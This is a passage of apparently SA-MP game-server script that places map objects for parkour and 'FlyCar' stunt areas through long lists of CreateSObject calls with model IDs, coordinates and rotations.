	CreateSObject(1225,233.03951,2506.54175,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,236.80304,2506.42944,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,244.89842,2506.46704,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,248.87939,2506.41748,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,249.00824,2502.51758,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,244.99084,2502.28809,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,241.07184,2502.17944,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,236.79285,2502.06689,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,232.73047,2502.23657,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,232.58029,2498.25269,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,232.98700,2494.51587,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,236.50502,2494.69922,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,240.97710,2498.55518,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,236.79793,2498.46387,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,241.02686,2494.59570,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,245.03621,2498.66650,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,244.99156,2494.24438,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,248.91814,2498.53345,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(1225,248.92570,2494.73120,20.63050,0.00000,0.00000,0.00000);
	CreateSObject(19001,79.87038,2456.70825,25.22002,0.00000,0.00000,5.95505);
	CreateSObject(13592,344.49963,2466.55103,25.35543,0.00000,0.00000,49.27800);
	CreateSObject(18786,191.57904,2535.03638,18.00894,0.00000,0.00000,344.43506);
	CreateSObject(826,354.59903,2539.32983,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,358.89783,2539.33105,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,357.10449,2541.87573,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,352.58527,2542.14868,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,351.01691,2538.93140,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,352.97046,2536.44653,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,356.10840,2535.67773,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(826,374.90887,2538.82104,15.63652,0.00000,0.00000,0.00000);
	CreateSObject(3515,363.15430,2528.84570,14.10980,0.00000,0.00000,0.00000);
	CreateSObject(10444,419.74069,2446.82764,15.51020,0.00000,0.00000,0.00000);
	CreateSObject(10444,390.79160,2446.89697,15.51020,0.00000,0.00000,0.00000);
	CreateSObject(10444,405.26379,2446.86230,15.51020,0.00000,0.00000,0.00000);
	CreateSObject(10444,419.55740,2469.23486,15.53020,0.00000,0.00000,270.00000);
	CreateSObject(10444,393.37408,2469.25000,15.51020,0.00000,0.00000,270.00000);
	CreateSObject(16771,404.80850,2426.13086,2.11160,270.00000,0.00000,180.00000);
	dbg(11,"6c2");
	// Parkour
    CreateSObject(5002, -744.215393, 1928.346069, 1.168277, 0.0000, 0.0000, 281.2500, object_show_distance, 0, world_challenges);
    CreateSObject(5002, -680.550354, 1950.041382, 1.167764, 0.0000, 0.0000, 80.1563, object_show_distance, 0, world_challenges);
    CreateSObject(8172, -739.905457, 1865.041138, 1.187637, 0.0000, 268.0403, 257.3438, object_show_distance, 0, world_challenges);
    CreateSObject(8172, -644.145081, 1845.225952, 1.187126, 0.0000, 271.0056, 258.7500, object_show_distance, 0, world_challenges);
    CreateSObject(8886, -775.450439, 1947.523193, 4.596059, 0.0000, 0.0000, 8.4375, object_show_distance, 0, world_challenges);
    CreateSObject(8886, -774.380432, 1941.764282, 10.029774, 0.0000, 0.0000, 9.8438, object_show_distance, 0, world_challenges);
    CreateSObject(16481, -768.924316, 1923.151611, 24.787603, 0.0000, 329.0603, 281.2500, object_show_distance, 0, world_challenges);
    CreateSObject(8884, -760.456299, 1895.035522, 41.555077, 0.0000, 0.8594, 101.2500, object_show_distance, 0, world_challenges);
    CreateSObject(14596, -760.660645, 1891.981323, 55.475433, 0.0000, 0.0000, 9.8438, object_show_distance, 0, world_challenges);
    CreateSObject(16644, -770.830139, 1894.149902, 62.114372, 0.0000, 0.0000, 11.2500, object_show_distance, 0, world_challenges);
    CreateSObject(8210, -769.815613, 1863.791870, 61.355560, 356.5623, 349.6868, 279.0617, object_show_distance, 0, world_challenges);
    CreateSObject(17019, -754.447144, 1802.588257, 69.668198, 0.0000, 0.0000, 101.2500, object_show_distance, 0, world_challenges);
    CreateSObject(1454, -764.424683, 1833.667847, 71.143204, 266.3215, 4.2972, 11.2500, object_show_distance, 0, world_challenges);
    CreateSObject(16301, -734.669678, 1816.151245, 83.012993, 0.0000, 351.4056, 56.2500, object_show_distance, 0, world_challenges);
    CreateSObject(16301, -745.759949, 1837.297119, 96.917664, 350.5462, 357.4217, 157.4227, object_show_distance, 0, world_challenges);
    CreateSObject(12860, -805.338440, 1858.745117, 101.182343, 0.0000, 0.0000, 164.5312, object_show_distance, 0, world_challenges);
    CreateSObject(1454, -783.139648, 1858.806030, 105.987823, 0.0000, 0.0000, 344.5312, object_show_distance, 0, world_challenges);
    CreateSObject(1454, -795.910034, 1862.211548, 109.987823, 0.0000, 0.0000, 348.7500, object_show_distance, 0, world_challenges);
    CreateSObject(1454, -797.521423, 1882.977417, 105.812813, 0.0000, 0.0000, 78.7500, object_show_distance, 0, world_challenges);
    CreateSObject(16002, -808.002136, 1863.734009, 116.080894, 0.0000, 0.0000, 258.7500, object_show_distance, 0, world_challenges);
    CreateSObject(8884, -791.713257, 1917.247437, 109.214348, 0.0000, 0.0000, 254.5312, object_show_distance, 0, world_challenges);
    CreateSObject(5262, -788.003418, 1927.085938, 115.611664, 0.0000, 0.0000, 74.5313, object_show_distance, 0, world_challenges);
    CreateSObject(3568, -781.975403, 1923.029419, 115.903648, 0.0000, 0.0000, 344.5312, object_show_distance, 0, world_challenges);
    CreateSObject(3568, -767.869873, 1924.174194, 115.229134, 0.0000, 0.0000, 255.9375, object_show_distance, 0, world_challenges);
    CreateSObject(3279, -757.711975, 1918.567871, 117.616608, 0.0000, 0.0000, 168.7500, object_show_distance, 0, world_challenges);
    CreateSObject(14411, -749.283142, 1917.038452, 137.354660, 5.1566, 0.0000, 258.7500, object_show_distance, 0, world_challenges);
    CreateSObject(9587, -685.492981, 1915.767944, 139.587173, 0.0000, 0.0000, 348.7500, object_show_distance, 0, world_challenges);
    CreateSObject(16531, -604.385803, 1902.775024, 146.632294, 358.2811, 18.9076, 168.7500, object_show_distance, 0, world_challenges);
    CreateSObject(18267, -560.040710, 1887.233398, 167.849564, 0.0000, 0.0000, 347.3438, object_show_distance, 0, world_challenges);
    CreateSObject(3279, -547.774109, 1888.944214, 167.971191, 0.0000, 0.0000, 165.9375, object_show_distance, 0, world_challenges);
    CreateSObject(16644, -548.115295, 1898.643555, 189.374939, 0.0000, 31.7992, 254.5312, object_show_distance, 0, world_challenges);
    CreateSObject(18367, -539.270874, 1934.669067, 189.536697, 0.0000, 0.0000, 345.9375, object_show_distance, 0, world_challenges);
    CreateSObject(18244, -537.993591, 1939.170654, 190.275497, 0.0000, 0.0000, 343.1250, object_show_distance, 0, world_challenges);
    CreateSObject(18244, -536.605225, 1944.300659, 190.675491, 0.0000, 0.0000, 253.1250, object_show_distance, 0, world_challenges);
    CreateSObject(18244, -534.899048, 1949.855347, 191.075485, 0.0000, 0.0000, 343.1250, object_show_distance, 0, world_challenges);
    CreateSObject(18244, -533.439026, 1954.595337, 192.700180, 0.0000, 0.0000, 251.7188, object_show_distance, 0, world_challenges);
    CreateSObject(13644, -530.754089, 1962.896240, 194.456360, 0.0000, 0.0000, 112.5000, object_show_distance, 0, world_challenges);
    CreateSObject(13644, -527.727417, 1972.254272, 197.674576, 0.0000, 0.0000, 112.5000, object_show_distance, 0, world_challenges);
    CreateSObject(2404, -526.661682, 1975.396973, 199.272095, 272.3375, 0.0000, 337.5000, object_show_distance, 0, world_challenges);
    CreateSObject(2404, -525.470581, 1978.227295, 199.331467, 274.0563, 0.0000, 337.5000, object_show_distance, 0, world_challenges);
    CreateSObject(7093, -535.915527, 1977.689453, 201.903961, 0.0000, 0.0000, 45.0000, object_show_distance, 0, world_challenges);
    CreateSObject(17020, -522.612915, 1999.509277, 200.993805, 0.0000, 0.0000, 156.0938, object_show_distance, 0, world_challenges);
    CreateSObject(16601, -509.946899, 2018.429810, 204.462357, 316.1687, 0.0000, 337.5000, object_show_distance, 0, world_challenges);
    CreateSObject(16601, -507.292725, 2024.846436, 211.674698, 136.6505, 0.0000, 337.5000, object_show_distance, 0, world_challenges);
    CreateSObject(9588, -491.521210, 2062.875977, 216.269379, 0.0000, 0.0000, 247.5000, object_show_distance, 0, world_challenges);
    CreateSObject(8886, -495.891449, 2100.770996, 224.167496, 0.0000, 0.0000, 247.5000, object_show_distance, 0, world_challenges);
    CreateSObject(18609, -497.128632, 2101.603027, 228.779633, 0.0000, 0.0000, 67.5000, object_show_distance, 0, world_challenges);
    CreateSObject(16303, -520.788940, 2112.177979, 224.778534, 1.7189, 10.3132, 348.7500, object_show_distance, 0, world_challenges);
    CreateSObject(13647, -553.133423, 2127.332031, 232.573029, 2.5783, 355.7028, 156.0937, object_show_distance, 0, world_challenges);
    CreateSObject(13647, -581.771301, 2140.226074, 234.891296, 0.0000, 0.0000, 336.0937, object_show_distance, 0, world_challenges);
    CreateSObject(13643, -610.804077, 2152.878174, 234.249573, 0.0000, 0.0000, 337.5000, object_show_distance, 0, world_challenges);
    CreateSObject(13638, -623.563171, 2164.539551, 235.822052, 0.0000, 0.0000, 337.5000, object_show_distance, 0, world_challenges);
    CreateSObject(6052, -627.865173, 2182.431885, 243.886230, 0.0000, 0.0000, 171.5625, object_show_distance, 0, world_challenges);
    CreateSObject(16766, -716.044373, 2226.057617, 253.347778, 359.1406, 354.8434, 157.5000, object_show_distance, 0, world_challenges);
    CreateSObject(9587, -826.455200, 2281.652832, 265.408569, 0.0000, 0.0000, 156.0937, object_show_distance, 0, world_challenges);
    CreateSObject(16644, -892.456299, 2306.554688, 266.812286, 0.0000, 0.0000, 336.0937, object_show_distance, 0, world_challenges);
    CreateSObject(4824, -910.485596, 2313.574951, 270.698242, 0.0000, 0.0000, 336.0937, object_show_distance, 0, world_challenges);
    CreateSObject(3627, -939.290710, 2326.315186, 283.641113, 324.7631, 0.0000, 246.0938, object_show_distance, 0, world_challenges);
    CreateSObject(979, -956.505920, 2334.209229, 298.311676, 80.7870, 4.2972, 336.1722, object_show_distance, 0, world_challenges);
    CreateSObject(13607, -994.384277, 2358.708008, 302.145569, 0.0000, 0.0000, 0.0000, object_show_distance, 0, world_challenges);
    // FlyCar
	CreateSObject(4563,-527.15,416.87,1135.53,0.00,0.00,306.31,object_show_distance,0,world_stunts);
	CreateSObject(4563,-455.24,333.98,1135.53,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(4563,-538.97,346.77,1135.53,0.00,0.00,306.31,object_show_distance,0,world_stunts);
	CreateSObject(4563,-484.25,373.87,892.66,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(4563,-443.42,404.10,1135.53,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(4563,-434.70,367.95,892.66,0.00,0.00,126.27,object_show_distance,0,world_stunts);
	CreateSObject(2918,-460.25,371.58,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-463.58,368.89,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-466.62,366.60,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-469.90,364.04,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-462.33,374.29,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-465.89,371.93,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-469.20,369.61,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-472.24,367.23,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-473.25,361.68,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-475.48,364.49,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-464.75,377.66,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-468.19,375.31,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-471.53,372.63,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-474.81,370.48,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-478.05,367.76,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-466.86,380.82,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-470.22,378.29,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-473.51,375.68,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-476.94,373.36,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-480.35,370.66,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-469.12,384.27,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-472.60,381.48,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-475.98,379.16,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-479.46,376.60,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-483.05,373.91,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-471.16,387.36,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-474.80,384.49,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-478.14,382.10,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-481.87,379.47,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-485.63,376.80,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.20,374.79,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-485.59,371.58,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-483.23,368.38,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-480.88,365.45,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-473.24,390.13,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-476.52,359.27,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-478.38,362.19,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.61,343.27,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.55,346.16,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-502.72,349.62,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-504.73,352.32,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-506.87,355.29,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-508.84,358.90,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-510.45,361.93,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-490.14,377.59,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-487.57,379.50,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-483.68,382.39,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-480.00,385.12,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-476.80,387.50,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-508.94,381.71,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-475.53,393.15,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-479.19,390.52,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-482.33,388.16,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-486.04,385.38,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-489.50,382.79,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-492.43,380.60,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-512.90,364.79,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-509.10,372.33,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-494.35,383.69,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.60,385.76,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.18,388.32,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-484.55,391.03,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-481.32,393.46,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-477.95,395.98,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-517.31,370.34,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-522.98,379.03,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-484.89,400.38,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-487.81,398.11,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-490.40,396.10,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-490.40,396.10,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.01,394.07,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-495.66,392.02,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.51,389.81,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-480.04,399.27,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-482.69,397.21,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-482.69,397.21,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-485.44,395.08,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.51,392.69,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.80,390.14,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-495.00,387.65,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-497.70,385.56,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.39,383.47,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-503.25,381.25,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-506.10,379.04,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-508.62,377.08,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-511.27,375.03,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-513.50,373.30,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-482.34,402.35,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-521.07,376.55,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-486.32,407.48,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.69,405.64,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.19,403.70,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.65,401.79,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-496.30,399.74,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.79,397.80,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-501.43,395.75,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-504.21,393.60,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-507.14,391.32,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-510.33,388.85,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-513.36,386.49,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-516.00,384.44,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-518.61,382.42,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-521.04,380.54,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-515.45,371.79,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-484.40,405.01,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-487.07,402.93,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-489.82,400.80,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-492.78,398.50,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-495.56,396.35,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.52,394.05,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-501.01,392.12,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-503.54,390.16,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-506.44,387.91,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-508.98,385.94,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-511.21,384.21,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-514.03,382.02,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-516.42,380.16,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-519.06,378.12,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-501.32,387.63,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-504.17,385.41,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-506.66,383.48,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-519.72,373.32,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-511.22,379.92,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-513.33,378.29,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-515.75,376.41,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-518.18,374.52,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-497.31,381.48,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-499.63,379.68,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-501.86,377.95,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-503.73,376.50,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-515.34,367.49,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-506.69,374.20,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-511.49,370.48,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-513.50,368.92,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-495.13,378.57,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-497.70,376.58,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.08,374.73,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-502.42,372.92,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-504.95,370.96,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-507.44,369.02,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-510.23,366.86,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.10,375.39,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-495.53,373.51,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-497.98,371.61,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.41,369.72,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.41,369.72,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-503.19,367.57,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-505.79,365.55,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-508.22,363.66,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.17,372.60,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.87,370.51,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-496.56,368.42,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-499.10,366.46,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-501.53,364.57,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-504.14,362.54,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-506.53,360.69,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.66,369.42,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.66,369.42,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-491.09,367.53,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.50,365.66,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-495.80,363.88,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.33,361.91,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.46,360.26,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-502.90,358.37,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-502.90,358.37,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-505.03,356.72,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-486.19,366.13,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-488.61,364.25,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-490.80,362.55,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-493.31,360.63,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-496.07,358.65,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-498.37,356.97,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
	CreateSObject(2918,-500.83,355.17,1068.89,0.00,0.00,0.00,object_show_distance,0,world_stunts);
